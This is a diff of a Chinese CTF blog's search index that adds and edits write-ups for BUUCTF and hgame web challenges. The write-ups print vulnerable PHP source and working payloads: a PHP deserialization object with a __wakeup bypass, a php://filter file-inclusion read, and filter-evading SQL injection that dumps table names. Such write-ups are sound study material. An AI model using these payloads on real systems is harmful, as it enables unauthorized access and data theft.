@@ -1,6 +1,67 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>BUUCTF-极客大挑战2019 PHP</title>
+    <url>/2020/02/04/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP/</url>
+    <content><![CDATA[<h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="极客大挑战 2019 PHP"></a>极客大挑战 2019 PHP</h1><p>打开题目 得到提示备份了网站<br>所以考虑</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php.bak   失败</span><br><span class="line">www.tar  失败</span><br><span class="line">www.zip  成功</span><br></pre></td></tr></table></figure>
+<p>下载到源码后 先查看一下index.php<br>得知用了反序列化的函数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">  &lt;title&gt;I have a cat!&lt;/title&gt;</span><br><span class="line">  &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css&quot;&gt;</span><br><span class="line">      &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    #login&#123;   </span><br><span class="line">        position: absolute;   </span><br><span class="line">        top: 50%;   </span><br><span class="line">        left:50%;   </span><br><span class="line">        margin: -150px 0 0 -150px;   </span><br><span class="line">        width: 300px;   </span><br><span class="line">        height: 300px;   </span><br><span class="line">    &#125;   </span><br><span class="line">    h4&#123;   </span><br><span class="line">        font-size: 2em;   </span><br><span class="line">        margin: 0.67em 0;   </span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;world&quot;&gt;</span><br><span class="line">    &lt;div style=&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;&quot;&gt;因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div style=&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 80%;left: 700px;font-family:KaiTi;&quot;&gt;不愧是我！！！</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div style=&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;&quot;&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">    include &apos;class.php&apos;;</span><br><span class="line">    $select = $_GET[&apos;select&apos;];</span><br><span class="line">    $res=unserialize(@$select);</span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div style=&quot;position: absolute;bottom: 5%;width: 99%;&quot;&gt;&lt;p align=&quot;center&quot; style=&quot;font:italic 15px Georgia,serif;color:white;&quot;&gt; Syclover @ cl4y&lt;/p&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script src=&apos;http://cdnjs.cloudflare.com/ajax/libs/three.js/r70/three.min.js&apos;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&apos;http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js&apos;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&apos;https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/OrbitControls.js&apos;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&apos;https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/Cat.js&apos;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script  src=&quot;index.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>接下来根据包含 查看class.php</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;flag.php&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &apos;nonono&apos;;</span><br><span class="line">    private $password = &apos;yesyes&apos;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username = &apos;guest&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password != 100) &#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username === &apos;admin&apos;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&apos;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>根据_destruct（）函数  得知this-&gt;password==100  this-&gt;username==admin时  输出flag</p>
+<p>随意在后面添加上</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a = new Name(&apos;admin&apos;,100);</span><br><span class="line">$b=serialize($a);</span><br><span class="line">echo $b;</span><br></pre></td></tr></table></figure>
+<p>启动本地PHP环境  访问一下新的class.php<br>得到</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;Syc&#123;dog_dog_dog_dog&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里不会了 看了一下WP<br>知识点：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">因为username和password都是私有变量，变量中的类名前后会有空白符，而复制的时候会丢失，所以加上加%00</span><br><span class="line"></span><br><span class="line">将Name后面的2改为3 是为了绕过__wakeup()  使其username不被覆盖</span><br></pre></td></tr></table></figure>
+
+<p>最后的payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p>学完JAVA之后 总算对反序列化这玩意 有点概念了  题不算太难 但是挺有意思的  开始我的反序列化之旅</p>
+<p>看了WP之后 得知还有用python提交的  更简便  等以后我会更新一下python脚本的方法</p>
+]]></content>
+      <categories>
+        <category>WP</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BUUCTF-极客大挑战 2019 Secret</title>
+    <url>/2020/02/04/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret/</url>
+    <content><![CDATA[<h1 id="极客大挑战-2019-Secret"><a href="#极客大挑战-2019-Secret" class="headerlink" title="极客大挑战 2019 Secret"></a>极客大挑战 2019 Secret</h1><p>打开题目 发现小㊙  查看一下源码 得到文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Archive_room.php</span><br></pre></td></tr></table></figure>
+<p><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Secret/0.png" alt="avatar"><br>点击SECRET</p>
+<p><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Secret/1.png" alt="avatar"><br>看来要用BP抓包了</p>
+<p>通过抓包确实得到一个action.php的文件<br><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Secret/2.png" alt="avatar"></p>
+<p>放到Reapter中 发包  得到文件secr3t.php </p>
+<p>访问得到源码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file=$_GET[&apos;file&apos;];</span><br><span class="line">    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">//flag放在了flag.php里</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>审计之后 构造payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secr3t.php?file=flag.php</span><br></pre></td></tr></table></figure>
+<p>发现不太行</p>
+<p>使用伪协议读取</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<p>得到base64  解码得到flag</p>
+]]></content>
+      <categories>
+        <category>WP</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>BUUCTF-RoarCTF2019 Easy Java</title>
     <url>/2020/02/03/BUUCTF-RoarCTF2019-Easy-Java/</url>
     <content><![CDATA[<h1 id="RoarCTF2019-Easy-Java"><a href="#RoarCTF2019-Easy-Java" class="headerlink" title="RoarCTF2019 Easy Java"></a>RoarCTF2019 Easy Java</h1><p>打开环境  根据题目提示是JAVA 点击help<br>得到java.io.FileNotFoundException:{help.docx}</p>
@@ -65,9 +126,9 @@
     <title>hgame-Cosmos的留言板-1</title>
     <url>/2020/01/27/hgame-Cosmos%E7%9A%84%E7%95%99%E8%A8%80%E6%9D%BF-1/</url>
     <content><![CDATA[<h1 id="Cosmos的留言板-1"><a href="#Cosmos的留言板-1" class="headerlink" title="Cosmos的留言板-1"></a>Cosmos的留言板-1</h1><p>打开环境 基本就可以知道是考SQL注入</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入</span><br><span class="line">1&apos; 没有回显，可以知道使用单引号保护变量</span><br><span class="line">1&apos;#  没有回显</span><br><span class="line">1# 有回显 可以用来查看一下过滤情况</span><br><span class="line">1/***/union/***/select#  得知select被过滤了</span><br><span class="line">1/****/union/***/select/***/table_schema/***/table_name/***/column/***/information_schema#  得知常规的SQL注入都没有被过滤</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入</span><br><span class="line">1&apos; 没有回显，可以知道使用单引号保护变量</span><br><span class="line">1&apos;#  没有回显</span><br><span class="line">1# 有回显 可以用来查看一下过滤情况</span><br><span class="line">1/**/union/**/select#  得知select被过滤了</span><br><span class="line">1/**/union/**/select/**/table_schema/**/table_name/**/column/**/information_schema#  得知常规的SQL注入都没有被过滤</span><br></pre></td></tr></table></figure>
 <p>最后得知过滤掉了select和空格</p>
-<p>这里有很多个方法 用/****/块注释代替空格<br>select的话可以用sel&lt;&gt;ect进行截断<br>或者大小写混写 SelecT</p>
+<p>这里有很多个方法 用/**/块注释代替空格<br>select的话可以用sel&lt;&gt;ect进行截断<br>或者大小写混写 SelecT</p>
 <p>再构造payload:</p>
 <pre><code>-1&apos;/**/or/**/&apos;1&apos;=&apos;1  回显正常</code></pre><p>爆表：</p>
 <pre><code>-1&apos;/**/union/**/SelecT/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/having&apos;1&apos;=&apos;1
@@ -130,9 +191,9 @@
     <title>hgame-Code World</title>
     <url>/2020/01/26/hgame-Code-World/</url>
     <content><![CDATA[<h1 id="Code-World"><a href="#Code-World" class="headerlink" title="Code World"></a>Code World</h1><p>打开竟然是个403</p>
-<p>用bp抓包<br>访问一下index.php<br>![avatar](/images/hgame/code world/0.png)</p>
+<p>用bp抓包<br>访问一下index.php<br><img src="/images/hgame/codeworld/0.png" alt="avatar"></p>
 <p>发现405错误<br><a href="https://www.jianshu.com/p/dd7315428462" target="_blank" rel="noopener">https://www.jianshu.com/p/dd7315428462</a></p>
-<p>所以更改为POST请求<br>![avatar](/images/hgame/code world/1.png)</p>
+<p>所以更改为POST请求<br><img src="/images/hgame/codeworld/1.png" alt="avatar"></p>
 <p>提示要求通过URL计算两个数相加为10</p>
 <p>所以直接URL：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/?a=1+9</span><br></pre></td></tr></table></figure>
